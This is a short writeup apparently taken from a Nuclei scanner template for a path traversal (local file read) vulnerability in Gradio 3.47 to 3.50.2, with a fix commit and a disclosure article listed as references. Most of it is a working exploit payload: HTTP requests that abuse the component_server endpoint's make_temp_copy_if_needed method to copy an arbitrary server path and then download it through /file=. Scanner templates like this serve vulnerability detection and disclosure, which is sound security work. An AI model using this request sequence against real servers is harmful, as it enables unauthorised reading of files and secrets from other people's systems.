# Nuclei Template: Gradio 3.47/3.50.2 - Local File Inclusion
**Template ID:** gradio-component-server-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`gradio-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Local file read by calling arbitrary methods of Components class between Gradio versions 3.47 / 3.50.2

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /component_server HTTP/1.1
Host: {{Hostname}}

POST /component_server HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"component_id": "{{fuzz_component_id}}", "data": "{{path}}", "fn_name": "make_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}

GET /file={{download_path}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2
- https://www.horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/
